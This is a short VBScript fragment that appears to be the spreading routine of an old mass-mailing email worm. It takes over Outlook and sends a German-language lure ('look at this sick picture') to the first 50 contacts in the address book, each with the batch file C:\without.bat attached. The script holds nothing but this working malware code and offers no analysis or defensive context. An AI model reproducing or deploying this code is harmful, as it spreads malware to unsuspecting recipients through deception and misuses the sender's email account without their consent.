Dim x 
on error resume next 
Set so=CreateObject("Scripting.FileSystemObject") 
Set ol=CreateObject("Outlook.Application") 
For x=1 To 50 
Set Mail=ol.CreateItem(0) 
Mail.to=ol.GetNameSpace("MAPI").AddressLists(1).AddressEntries(x) 
Mail.Subject="Hi!!" 
Mail.Body="Hi! Guck dir mal das kranke Bild an! ;-)" 
Mail.Attachments.Add("C:\without.bat") 
Mail.Send 
Next 
ol.Quit 
